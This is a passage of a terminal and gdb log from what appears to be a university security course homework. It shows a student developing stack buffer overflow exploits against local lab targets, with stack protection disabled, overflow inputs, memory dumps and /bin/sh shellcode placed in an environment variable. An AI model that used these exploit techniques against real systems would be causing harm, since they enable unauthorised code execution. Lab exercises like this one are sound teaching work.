325	../csu/libc-start.c: No such file or directory.
(gdb) n
[Inferior 1 (process 2367) exited normally]
(gdb) n
The program is not being run.
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "rrrrrrrrrr" "399"
input_size=399Hi rrrrrrrrrr
Bye rrrrrrrrrr
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "rrrrrrrrrr" "499"
Error: input_size not 399
input_size=499Bye rrrrrrrrrr
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "rrrrrrrrrr" "499-199"
Error: input_size not 399
input_size=499Bye rrrrrrrrrr
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "rrrrrrrrrr" "499.199"
Error: input_size not 399
input_size=499Bye rrrrrrrrrr
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "rrrrrrrrrr" "399.199"
input_size=399Hi rrrrrrrrrr
Bye rrrrrrrrrr
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "rrrrrrrrrr" "399,199"
input_size=399Hi rrrrrrrrrr
Bye rrrrrrrrrr
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "rrrrrrrrrr" "399 3333"
input_size=399Hi rrrrrrrrrr
Bye rrrrrrrrrr
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "rrrrrrrrrr" "3993333"
Error: input_size not 399
input_size=3993333Bye rrrrrrrrrr
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "rrrrrrrrrr" "2147483648"
Error: input_size not 399
input_size=2147483647Bye rrrrrrrrrr
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "rrrrrrrrrr" "2147483648333"
Error: input_size not 399
input_size=2147483647Bye rrrrrrrrrr
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "rrrrrrrrrr" "21%3"
Error: input_size not 399
input_size=21Bye rrrrrrrrrr
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target2 "rrrrrrrrrr" "0000000000000000999999"
Error: input_size not 399
input_size=999999Bye rrrrrrrrrr
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit2
input_size=399Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Bye AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit2
input_size=399Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Bye AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804850b: file sploit2.c, line 26.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:26
26	  char *noop = "A";
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 2622 is executing new program: /tmp/target2

Breakpoint 1, main (argc=3, argv=0xbffffdd4) at target2.c:22
22	  int real_size = 0;
(gdb) b 15
Breakpoint 3 at 0x8048562: file target2.c, line 15.
(gdb) continue
Continuing.

Breakpoint 3, greeting (temp1=0xbffffebe 'A' <repeats 200 times>..., input_size=399) at target2.c:15
15	  strcpy(name, temp1);
(gdb) info frame
Stack level 0, frame at 0xbffffd28:
 eip = 0x8048562 in greeting (target2.c:15); saved eip = 0x8048635
 called by frame at 0xbffffd40
 source language c.
 Arglist at 0xbffffd20, args: temp1=0xbffffebe 'A' <repeats 200 times>..., input_size=399
 Locals at 0xbffffd20, Previous frame's sp is 0xbffffd28
 Saved registers:
  ebp at 0xbffffd20, eip at 0xbffffd24
(gdb) x/32 0xbffffd24-64
0xbffffce4:	960049930	0	-1209993320	-1209749301
0xbffffcf4:	0	-1208242176	-1208242176	-1073742536
0xbffffd04:	-1209719146	-1208238752	134514451	-1073742544
0xbffffd14:	-1209719184	399	-1207961320	-1073742536
0xbffffd24:	134514229	-1073742146	399	399
0xbffffd34:	300	0	-1209919945	3
0xbffffd44:	-1073742380	-1073742364	0	0
0xbffffd54:	0	-1208242176	-1207960572	-1207963648
(gdb) x/32x 0xbffffd24-64
0xbffffce4:	0x3939330a	0x00000000	0xb7e0f798	0xb7e4b0cb
0xbffffcf4:	0x00000000	0xb7fbb000	0xb7fbb000	0xbffffd38
0xbffffd04:	0xb7e52696	0xb7fbbd60	0x08048713	0xbffffd30
0xbffffd14:	0xb7e52670	0x0000018f	0xb7fff918	0xbffffd38
0xbffffd24:	0x08048635	0xbffffebe	0x0000018f	0x0000018f
0xbffffd34:	0x0000012c	0x00000000	0xb7e21637	0x00000003
0xbffffd44:	0xbffffdd4	0xbffffde4	0x00000000	0x00000000
0xbffffd54:	0x00000000	0xb7fbb000	0xb7fffc04	0xb7fff000
(gdb) x/64x 0xbffffd24-64
0xbffffce4:	0x3939330a	0x00000000	0xb7e0f798	0xb7e4b0cb
0xbffffcf4:	0x00000000	0xb7fbb000	0xb7fbb000	0xbffffd38
0xbffffd04:	0xb7e52696	0xb7fbbd60	0x08048713	0xbffffd30
0xbffffd14:	0xb7e52670	0x0000018f	0xb7fff918	0xbffffd38
0xbffffd24:	0x08048635	0xbffffebe	0x0000018f	0x0000018f
0xbffffd34:	0x0000012c	0x00000000	0xb7e21637	0x00000003
0xbffffd44:	0xbffffdd4	0xbffffde4	0x00000000	0x00000000
0xbffffd54:	0x00000000	0xb7fbb000	0xb7fffc04	0xb7fff000
0xbffffd64:	0x00000000	0xb7fbb000	0xb7fbb000	0x00000000
0xbffffd74:	0x38cc0739	0x031d6929	0x00000000	0x00000000
0xbffffd84:	0x00000000	0x00000003	0x08048430	0x00000000
0xbffffd94:	0xb7ff0010	0xb7fea880	0xb7fff000	0x00000003
0xbffffda4:	0x08048430	0x00000000	0x08048451	0x0804858a
0xbffffdb4:	0x00000003	0xbffffdd4	0x08048660	0x080486c0
0xbffffdc4:	0xb7fea880	0xbffffdcc	0xb7fff918	0x00000003
0xbffffdd4:	0xbffffeb1	0xbffffebe	0xbfffffeb	0x00000000
(gdb) x/64x 0xbffffd24-128
0xbffffca4:	0xb7fff918	0x0804a00c	0xb7fe98a2	0xb7fffad0
0xbffffcb4:	0xb7fd54a0	0x00000001	0x00000001	0x00000000
0xbffffcc4:	0xb7e390b9	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffcd4:	0xbffffd38	0xb7fff000	0x08048280	0x00000000
0xbffffce4:	0x3939330a	0x00000000	0xb7e0f798	0xb7e4b0cb
0xbffffcf4:	0x00000000	0xb7fbb000	0xb7fbb000	0xbffffd38
0xbffffd04:	0xb7e52696	0xb7fbbd60	0x08048713	0xbffffd30
0xbffffd14:	0xb7e52670	0x0000018f	0xb7fff918	0xbffffd38
0xbffffd24:	0x08048635	0xbffffebe	0x0000018f	0x0000018f
0xbffffd34:	0x0000012c	0x00000000	0xb7e21637	0x00000003
0xbffffd44:	0xbffffdd4	0xbffffde4	0x00000000	0x00000000
0xbffffd54:	0x00000000	0xb7fbb000	0xb7fffc04	0xb7fff000
0xbffffd64:	0x00000000	0xb7fbb000	0xb7fbb000	0x00000000
0xbffffd74:	0x38cc0739	0x031d6929	0x00000000	0x00000000
0xbffffd84:	0x00000000	0x00000003	0x08048430	0x00000000
0xbffffd94:	0xb7ff0010	0xb7fea880	0xb7fff000	0x00000003
(gdb) n
16	  printf( "Hi %s\n", name );
(gdb) x/64x 0xbffffd24-128
0xbffffca4:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffcb4:	0x41414141	0x41414141	0x00000000	0x00000000
0xbffffcc4:	0xb7e390b9	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffcd4:	0xbffffd38	0xb7fff000	0x08048280	0x00000000
0xbffffce4:	0x3939330a	0x00000000	0xb7e0f798	0xb7e4b0cb
0xbffffcf4:	0x00000000	0xb7fbb000	0xb7fbb000	0xbffffd38
0xbffffd04:	0xb7e52696	0xb7fbbd60	0x08048713	0xbffffd30
0xbffffd14:	0xb7e52670	0x0000018f	0xb7fff918	0xbffffd38
0xbffffd24:	0x08048635	0xbffffebe	0x0000018f	0x0000018f
0xbffffd34:	0x0000012c	0x00000000	0xb7e21637	0x00000003
0xbffffd44:	0xbffffdd4	0xbffffde4	0x00000000	0x00000000
0xbffffd54:	0x00000000	0xb7fbb000	0xb7fffc04	0xb7fff000
0xbffffd64:	0x00000000	0xb7fbb000	0xb7fbb000	0x00000000
0xbffffd74:	0x38cc0739	0x031d6929	0x00000000	0x00000000
0xbffffd84:	0x00000000	0x00000003	0x08048430	0x00000000
0xbffffd94:	0xb7ff0010	0xb7fea880	0xb7fff000	0x00000003
(gdb) q
A debugging session is active.

	Inferior 1 [process 2622] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1  sploit1.c  sploit2  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ /tmp/target3 "4"
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb /tmp/target3
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /tmp/target3...done.
(gdb) break main
Breakpoint 1 at 0x80484c9: file target3.c, line 19.
(gdb) run "4"
Starting program: /tmp/target3 "4"

Breakpoint 1, main (argc=2, argv=0xbffff694) at target3.c:19
19	  if( argc != 2 )
(gdb) break 9
Breakpoint 2 at 0x80484a1: file target3.c, line 9.
(gdb) n
25	  foo( argv[1] );
(gdb) n

Breakpoint 2, copyFourInts (values=0xbffff7d1 "4") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffff5e8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffff5f4
 source language c.
 Arglist at 0xbffff5e0, args: values=0xbffff7d1 "4"
 Locals at 0xbffff5e0, Previous frame's sp is 0xbffff5e8
 Saved registers:
  ebp at 0xbffff5e0, eip at 0xbffff5e4
(gdb) x/64x 0xbffff5e4-32
0xbffff5c4:	0x00000000	0xb7e37a50	0x0804855b	0x00000002
0xbffff5d4:	0xbffff694	0xbffff6a0	0x08048531	0xbffff5ec
0xbffff5e4:	0x080484c0	0xbffff7d1	0xbffff5f8	0x080484fb
0xbffff5f4:	0xbffff7d1	0x00000000	0xb7e21637	0x00000002
0xbffff604:	0xbffff694	0xbffff6a0	0x00000000	0x00000000
0xbffff614:	0x00000000	0xb7fbb000	0xb7fffc04	0xb7fff000
0xbffff624:	0x00000000	0xb7fbb000	0xb7fbb000	0x00000000
0xbffff634:	0x7524f318	0x4ee31d08	0x00000000	0x00000000
0xbffff644:	0x00000000	0x00000002	0x080483a0	0x00000000
0xbffff654:	0xb7ff0010	0xb7fea880	0xb7fff000	0x00000002
0xbffff664:	0x080483a0	0x00000000	0x080483c1	0x080484c6
0xbffff674:	0x00000002	0xbffff694	0x08048510	0x08048570
0xbffff684:	0xb7fea880	0xbffff68c	0xb7fff918	0x00000002
0xbffff694:	0xbffff7c4	0xbffff7d1	0x00000000	0xbffff7d3
0xbffff6a4:	0xbffff7e4	0xbffff7f4	0xbffff808	0xbffff825
0xbffff6b4:	0xbffff838	0xbffff845	0xbffffdcd	0xbffffdd9
(gdb) n
10	}
(gdb) x/64x 0xbffff5e4-32
0xbffff5c4:	0xbffff5d0	0xbffff7d1	0x00000014	0x44580034
0xbffff5d4:	0x45535f47	0x4f495353	0x44495f4e	0x5300313d
0xbffff5e4:	0x080484c0	0xbffff7d1	0xbffff5f8	0x080484fb
0xbffff5f4:	0xbffff7d1	0x00000000	0xb7e21637	0x00000002
0xbffff604:	0xbffff694	0xbffff6a0	0x00000000	0x00000000
0xbffff614:	0x00000000	0xb7fbb000	0xb7fffc04	0xb7fff000
0xbffff624:	0x00000000	0xb7fbb000	0xb7fbb000	0x00000000
0xbffff634:	0x7524f318	0x4ee31d08	0x00000000	0x00000000
0xbffff644:	0x00000000	0x00000002	0x080483a0	0x00000000
0xbffff654:	0xb7ff0010	0xb7fea880	0xb7fff000	0x00000002
0xbffff664:	0x080483a0	0x00000000	0x080483c1	0x080484c6
0xbffff674:	0x00000002	0xbffff694	0x08048510	0x08048570
0xbffff684:	0xb7fea880	0xbffff68c	0xb7fff918	0x00000002
0xbffff694:	0xbffff7c4	0xbffff7d1	0x00000000	0xbffff7d3
0xbffff6a4:	0xbffff7e4	0xbffff7f4	0xbffff808	0xbffff825
0xbffff6b4:	0xbffff838	0xbffff845	0xbffffdcd	0xbffffdd9
(gdb) n
foo (values=<error reading variable: Cannot access memory at address 0x53003145>) at target3.c:15
15	}
(gdb) n

Program received signal SIGSEGV, Segmentation fault.
0x080484c4 in foo (values=<error reading variable: Cannot access memory at address 0x53003145>)
    at target3.c:15
15	}
(gdb) 

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb) run 4444
Starting program: /tmp/target3 4444

Breakpoint 1, main (argc=2, argv=0xbffff694) at target3.c:19
19	  if( argc != 2 )
(gdb) continue
Continuing.

Breakpoint 2, copyFourInts (values=0xbffff7ce "4444") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffff5e8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffff5f4
 source language c.
 Arglist at 0xbffff5e0, args: values=0xbffff7ce "4444"
 Locals at 0xbffff5e0, Previous frame's sp is 0xbffff5e8
 Saved registers:
  ebp at 0xbffff5e0, eip at 0xbffff5e4
(gdb) x/64x 0xbffff5e4-32
0xbffff5c4:	0x00000000	0xb7e37a50	0x0804855b	0x00000002
0xbffff5d4:	0xbffff694	0xbffff6a0	0x08048531	0xbffff5ec
0xbffff5e4:	0x080484c0	0xbffff7ce	0xbffff5f8	0x080484fb
0xbffff5f4:	0xbffff7ce	0x00000000	0xb7e21637	0x00000002
0xbffff604:	0xbffff694	0xbffff6a0	0x00000000	0x00000000
0xbffff614:	0x00000000	0xb7fbb000	0xb7fffc04	0xb7fff000
0xbffff624:	0x00000000	0xb7fbb000	0xb7fbb000	0x00000000
0xbffff634:	0x9d10b33c	0xa6d75d2c	0x00000000	0x00000000
0xbffff644:	0x00000000	0x00000002	0x080483a0	0x00000000
0xbffff654:	0xb7ff0010	0xb7fea880	0xb7fff000	0x00000002
0xbffff664:	0x080483a0	0x00000000	0x080483c1	0x080484c6
0xbffff674:	0x00000002	0xbffff694	0x08048510	0x08048570
0xbffff684:	0xb7fea880	0xbffff68c	0xb7fff918	0x00000002
0xbffff694:	0xbffff7c1	0xbffff7ce	0x00000000	0xbffff7d3
0xbffff6a4:	0xbffff7e4	0xbffff7f4	0xbffff808	0xbffff825
0xbffff6b4:	0xbffff838	0xbffff845	0xbffffdcd	0xbffffdd9
(gdb) n
10	}
(gdb) x/64x 0xbffff5e4-32
0xbffff5c4:	0xbffff5d0	0xbffff7ce	0x00000014	0x34343434
0xbffff5d4:	0x47445800	0x5345535f	0x4e4f4953	0x3d44495f
0xbffff5e4:	0x080484c0	0xbffff7ce	0xbffff5f8	0x080484fb
0xbffff5f4:	0xbffff7ce	0x00000000	0xb7e21637	0x00000002
0xbffff604:	0xbffff694	0xbffff6a0	0x00000000	0x00000000
0xbffff614:	0x00000000	0xb7fbb000	0xb7fffc04	0xb7fff000
0xbffff624:	0x00000000	0xb7fbb000	0xb7fbb000	0x00000000
0xbffff634:	0x9d10b33c	0xa6d75d2c	0x00000000	0x00000000
0xbffff644:	0x00000000	0x00000002	0x080483a0	0x00000000
0xbffff654:	0xb7ff0010	0xb7fea880	0xb7fff000	0x00000002
0xbffff664:	0x080483a0	0x00000000	0x080483c1	0x080484c6
0xbffff674:	0x00000002	0xbffff694	0x08048510	0x08048570
0xbffff684:	0xb7fea880	0xbffff68c	0xb7fff918	0x00000002
0xbffff694:	0xbffff7c1	0xbffff7ce	0x00000000	0xbffff7d3
0xbffff6a4:	0xbffff7e4	0xbffff7f4	0xbffff808	0xbffff825
0xbffff6b4:	0xbffff838	0xbffff845	0xbffffdcd	0xbffffdd9
(gdb) q
A debugging session is active.

	Inferior 1 [process 2638] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1  sploit1.c  sploit2  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls -la
total 84
drwxr-xr-x 2 student student  4096 Nov 29 19:48 .
drwxr-xr-x 6 student student  4096 Nov 26 10:49 ..
-rwxr-xr-x 1 student student   475 Nov 26 10:49 shellcode.h
-rwxrwxr-x 1 student student 10316 Nov 29 13:37 sploit0
-rw-r--r-- 1 student student  1089 Nov 27 20:20 sploit0.c
-rwxrwxr-x 1 student student 10340 Nov 29 14:12 sploit1
-rw-r--r-- 1 student student  1015 Nov 29 14:12 sploit1.c
-rwxrwxr-x 1 student student 10260 Nov 29 19:28 sploit2
-rw-r--r-- 1 student student   964 Nov 29 19:28 sploit2.c
-rwxrwxr-x 1 student student 10144 Nov 29 19:48 sploit3
-rw-r--r-- 1 student student   665 Nov 29 19:48 sploit3.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploit4.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit3
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852c: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 2684 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffea4) at target3.c:19
19	  if( argc != 2 )
(gdb) break 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) info frame
Stack level 0, frame at 0xbffffe10:
 eip = 0x80484c9 in main (target3.c:19); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffffe08, args: argc=2, argv=0xbffffea4
 Locals at 0xbffffe08, Previous frame's sp is 0xbffffe10
 Saved registers:
  ebp at 0xbffffe08, eip at 0xbffffe0c
(gdb) p/x getenv("shellcode")
$1 = 0xbfffffa7
(gdb) x/64x 0xbfffffa7-32
0xbfffff87:	0x00000000	0x706d742f	0x7261742f	0x33746567
0xbfffff97:	0xffff9f00	0x687300bf	0x636c6c65	0x3d65646f
0xbfffffa7:	0xdb31c031	0x80cd17b0	0x895e1feb	0xc0310876
0xbfffffb7:	0x89074688	0x0bb00c46	0x4e8df389	0x0c568d08
0xbfffffc7:	0xdb3180cd	0xcd40d889	0xffdce880	0x622fffff
0xbfffffd7:	0x732f6e69	0x742f0068	0x742f706d	0x65677261
0xbfffffe7:	0x9f003374	0x00bfffff	0x706d742f	0x7261742f
0xbffffff7:	0x33746567	0x00000000	Cannot access memory at address 0xc0000000
(gdb) n
25	  foo( argv[1] );
(gdb) n

Breakpoint 3, copyFourInts (values=0xbfffff98 "\237\377\377\277") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffdf8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffe04
 source language c.
 Arglist at 0xbffffdf0, args: values=0xbfffff98 "\237\377\377\277"
 Locals at 0xbffffdf0, Previous frame's sp is 0xbffffdf8
 Saved registers:
  ebp at 0xbffffdf0, eip at 0xbffffdf4
(gdb) x/64x 0xbffffdf4-32
0xbffffdd4:	0xb7fbb000	0xbffffddc	0xbffffdff	0x0804b008
0xbffffde4:	0xbffffea4	0xbffffeb0	0x08048531	0xbffffdfc
0xbffffdf4:	0x080484c0	0xbfffff98	0xbffffe08	0x080484fb
0xbffffe04:	0xbfffff98	0x00000000	0xb7e21637	0x00000002
0xbffffe14:	0xbffffea4	0xbffffeb0	0x00000000	0x00000000
0xbffffe24:	0x00000000	0xb7fbb000	0xb7fffc04	0xb7fff000
0xbffffe34:	0x00000000	0xb7fbb000	0xb7fbb000	0x00000000
0xbffffe44:	0x52118be0	0x69c645f0	0x00000000	0x00000000
0xbffffe54:	0x00000000	0x00000002	0x080483a0	0x00000000
0xbffffe64:	0xb7ff0010	0xb7fea880	0xb7fff000	0x00000002
0xbffffe74:	0x080483a0	0x00000000	0x080483c1	0x080484c6
0xbffffe84:	0x00000002	0xbffffea4	0x08048510	0x08048570
0xbffffe94:	0xb7fea880	0xbffffe9c	0xb7fff918	0x00000002
0xbffffea4:	0xbfffff8b	0xbfffff98	0x00000000	0xbfffff9d
0xbffffeb4:	0xbfffffdd	0xbfffffea	0x00000000	0x00000020
0xbffffec4:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
(gdb) n
10	}
(gdb) x/64x 0xbffffdf4-32
0xbffffdd4:	0xbffffde0	0xbfffff98	0x00000014	0xbfffff9f
0xbffffde4:	0x65687300	0x6f636c6c	0x313d6564	0xb0db31c0
0xbffffdf4:	0x080484c0	0xbfffff98	0xbffffe08	0x080484fb
0xbffffe04:	0xbfffff98	0x00000000	0xb7e21637	0x00000002
0xbffffe14:	0xbffffea4	0xbffffeb0	0x00000000	0x00000000
0xbffffe24:	0x00000000	0xb7fbb000	0xb7fffc04	0xb7fff000
0xbffffe34:	0x00000000	0xb7fbb000	0xb7fbb000	0x00000000
0xbffffe44:	0x52118be0	0x69c645f0	0x00000000	0x00000000
0xbffffe54:	0x00000000	0x00000002	0x080483a0	0x00000000
0xbffffe64:	0xb7ff0010	0xb7fea880	0xb7fff000	0x00000002
0xbffffe74:	0x080483a0	0x00000000	0x080483c1	0x080484c6
0xbffffe84:	0x00000002	0xbffffea4	0x08048510	0x08048570
0xbffffe94:	0xb7fea880	0xbffffe9c	0xb7fff918	0x00000002
0xbffffea4:	0xbfffff8b	0xbfffff98	0x00000000	0xbfffff9d
0xbffffeb4:	0xbfffffdd	0xbfffffea	0x00000000	0x00000020
0xbffffec4:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
(gdb) p/x intvalues
$2 = {0xbfffff9f, 0x65687300, 0x6f636c6c, 0x313d6564}
(gdb) q
A debugging session is active.

	Inferior 1 [process 2684] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit3
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852c: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 2734 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffea4) at target3.c:19
19	  if( argc != 2 )
(gdb) break 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) continue
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff98 "\241\377\377\277") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffdf8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffe04
 source language c.
 Arglist at 0xbffffdf0, args: values=0xbfffff98 "\241\377\377\277"
 Locals at 0xbffffdf0, Previous frame's sp is 0xbffffdf8
 Saved registers:
  ebp at 0xbffffdf0, eip at 0xbffffdf4
(gdb) x/64x 0xbffffdf4-32
0xbffffdd4:	0x00000000	0xb7e37a50	0x0804855b	0x00000002
0xbffffde4:	0xbffffea4	0xbffffeb0	0x08048531	0xbffffdfc
0xbffffdf4:	0x080484c0	0xbfffff98	0xbffffe08	0x080484fb
0xbffffe04:	0xbfffff98	0x00000000	0xb7e21637	0x00000002
0xbffffe14:	0xbffffea4	0xbffffeb0	0x00000000	0x00000000
0xbffffe24:	0x00000000	0xb7fbb000	0xb7fffc04	0xb7fff000
0xbffffe34:	0x00000000	0xb7fbb000	0xb7fbb000	0x00000000
0xbffffe44:	0x73cc2d87	0x481be397	0x00000000	0x00000000
0xbffffe54:	0x00000000	0x00000002	0x080483a0	0x00000000
0xbffffe64:	0xb7ff0010	0xb7fea880	0xb7fff000	0x00000002
0xbffffe74:	0x080483a0	0x00000000	0x080483c1	0x080484c6
0xbffffe84:	0x00000002	0xbffffea4	0x08048510	0x08048570
0xbffffe94:	0xb7fea880	0xbffffe9c	0xb7fff918	0x00000002
0xbffffea4:	0xbfffff8b	0xbfffff98	0x00000000	0xbfffff9d
0xbffffeb4:	0xbfffffdd	0xbfffffea	0x00000000	0x00000020
0xbffffec4:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
(gdb) n
10	}
(gdb) x/64x 0xbffffdf4-32
0xbffffdd4:	0xbffffde0	0xbfffff98	0x00000014	0xbfffffa1
0xbffffde4:	0x65687300	0x6f636c6c	0x313d6564	0xb0db31c0
